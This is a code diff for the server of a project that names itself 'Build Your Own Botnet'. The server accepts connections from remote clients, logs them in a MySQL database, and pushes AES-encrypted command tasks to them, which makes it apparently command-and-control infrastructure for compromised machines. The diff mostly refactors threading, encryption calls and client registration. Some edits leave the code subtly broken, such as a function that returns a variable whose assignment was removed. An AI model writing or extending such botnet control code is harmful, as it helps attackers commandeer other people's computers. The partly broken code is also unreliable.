@@ -17,6 +17,7 @@ import socket
 import struct
 import base64
 import random
+import select
 import logging
 import requests
 import colorama
@@ -64,6 +65,11 @@ def threaded(function):
 
 class TaskHandler(SocketServer.BaseRequestHandler):
 
+    """
+    TaskHandler (Build Your Own Botnet)
+    
+    """
+
     def handle(self):
         while True:
             try:
@@ -92,6 +98,11 @@ class TaskHandler(SocketServer.BaseRequestHandler):
 
 class TaskServer(SocketServer.ThreadingTCPServer):
 
+    """
+    TaskServer (Build Your Own Botnet)
+    
+    """
+
     allow_reuse_address = True
 
     def __init__(self, host='0.0.0.0', port=1338, handler=TaskHandler):
@@ -110,6 +121,7 @@ class TaskServer(SocketServer.ThreadingTCPServer):
             abort = self._abort
             if abort:
                 break
+            
 
 
 class Database(mysql.connector.MySQLConnection):
@@ -286,10 +298,14 @@ class Database(mysql.connector.MySQLConnection):
         args = (json.dumps(client._info), '@client')
         _ = self.execute_procedure('sp_handle_client', args=args, display=False)
         info = self.execute_query('SELECT @client', display=False)
-        client._info = info
-        if client._info['uid'] not in self.tasks:
-            self.tasks[client._info['uid']] = []
-        return info
+        if isinstance(info, dict):
+            client._info = info
+            if 'uid' in info:
+                if info['uid'] not in self.tasks:
+                    self.tasks[client._info['uid']] = []
+        else:
+            Util.debug("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(info)))
+        return client
 
     def handle_task(self, task):
         """ 
@@ -302,9 +318,9 @@ class Database(mysql.connector.MySQLConnection):
                 except:
                     pass
             if isinstance(task, dict):
-                args = (json.dumps(task), '@taskid')
+                args = (json.dumps(task), '@row')
                 _ = self.execute_procedure("sp_handle_task", args=args)
-                task_id = self.execute_query("SELECT @taskid")
+                task_id = self.execute_query("SELECT @row")
                 self.tasks[task['client']].append(task_id)
                 return task_id
             else:
@@ -413,6 +429,7 @@ class Server(threading.Thread):
         self._prompt            = None
         self._abort             = False
         self._count             = 1
+        self._threads           = {}
         self._debug             = debug
         self._name              = time.time()
         self._lock              = threading.Lock()
@@ -422,6 +439,8 @@ class Server(threading.Thread):
         self._text_style        = colorama.Style.DIM
         self._prompt_color      = colorama.Fore.RESET
         self._prompt_style      = colorama.Style.BRIGHT
+        self._threads['task_handler'] = self._task_handler()
+        self._threads['connection_handler'] = self._connection_handler()
         self._commands          = {
             'help'          :   self.help,
             'exit'          :   self.quit,
@@ -443,6 +462,7 @@ class Server(threading.Thread):
             'tasks'         :   self.task_list,
             'query'         :   self.database.execute_query
             }
+        
 
 
     def _server_prompt(self, data):
@@ -516,6 +536,7 @@ class Server(threading.Thread):
         except Exception as e:
             self._error(str(e))
 
+
     def _get_database(self):
         try:
             print(util.color() + colorama.Style.BRIGHT + "\n\n" + open('resources/banner.txt').read() + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
@@ -527,7 +548,6 @@ class Server(threading.Thread):
                     if self.config.has_section('tasks'):
                         tasks = [k for k,v in self.config['tasks'].items() if v]
                     db = Database(**self.config['database'])
-                    db.cmd_init_db('byob')
                     print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
                 except:
                     max_v = max(map(len, self.config['database'].values())) + 2
@@ -566,7 +586,7 @@ class Server(threading.Thread):
                 if server.config[section].has_option(option):
                     result = server.config[section].get(option)
                     task.update({'result' : result})
-                    output = self._encrypt(json.dumps(task), client.session_key)
+                    output = security.encrypt_aes(json.dumps(task), client.session_key)
                     connection.sendall(struct.pack('L', len(output)) + output)
                 else:
                     self._return("%s error: invalid API request ('%s')" % (self._handle_request.func_name, option))
@@ -577,12 +597,22 @@ class Server(threading.Thread):
 
 
     @threaded
+    def _task_handler(self):
+        try:
+            task_handler = TaskServer()
+            task_handler.serve_until_stopped()
+        except Exception as e:
+            self._error(str(e))
+
+
+    @threaded
     def _connection_handler(self, sock=None):
         if not sock:
             sock = self._socket
         while True:
             conn, addr = sock.accept()
             client  = ClientHandler(connection=conn, name=self._count, server=self, lock=self._lock)
+            client  = self.database.handle_client(client)
             self.clients[self._count] = client
             self._count  += 1
             client.start()                        
@@ -709,7 +739,7 @@ class Server(threading.Thread):
             try:
                 task    = {'client': client.info['id'], 'command': command}
                 task_id = self.database.handle_task(task)
-                data    = self._encrypt(json.dumps(task), client.session_key)
+                data    = security.encrypt_aes(json.dumps(task), client.session_key)
                 sock.sendall(struct.pack("L", len(data))+data)
                 client._connection.sendall(data)
             except Exception as e:
@@ -737,7 +767,7 @@ class Server(threading.Thread):
                     msg += connection.recv(1)
                 if msg:
                     try:
-                        data = self._decrypt(msg, client.session_key)
+                        data = security.decrypt_aes(msg, client.session_key)
                         try:
                             return json.loads(data)
                         except Exception as e:
@@ -755,12 +785,12 @@ class Server(threading.Thread):
 
     def task_list(self, client_id=None):
         try:
-	    client = self._get_client(client_id) if client_id else None
-	    uid = client.uid if client else None
+            client = self._get_client(client_id) if client_id else None
+            uid = client.uid if client else None
             if uid:
-		return self.database.get_tasks(uid)
-	    else:
-		return self.database.get_tasks()
+                return self.database.get_tasks(uid)
+            else:
+                return self.database.get_tasks()
         except Exception as e:
             util.debug(e)
             
@@ -875,9 +905,7 @@ class Server(threading.Thread):
         lock    = self._lock if not self.current_client else self.current_client._lock
         with lock:
             print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n----------------------------------------------------------------------------------------------')
-            clients = self.database.get_clients(verbose=verbose)
-            for k, v in clients.items():
-                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v._connection.getpeername()[0]))
+            clients = self.database.get_clients(verbose=verbose, display=True)
             print('\n')
 
 
@@ -990,7 +1018,6 @@ class ClientHandler(threading.Thread):
                 buf += self._socket.recv(1024)
             text = server._decrypt(buf.rstrip(), self.session_key)
             data = json.loads(text.rstrip())
-            info = self.database.handle_client(data)
             return info
         except Exception as e:
             self._error(str(e))
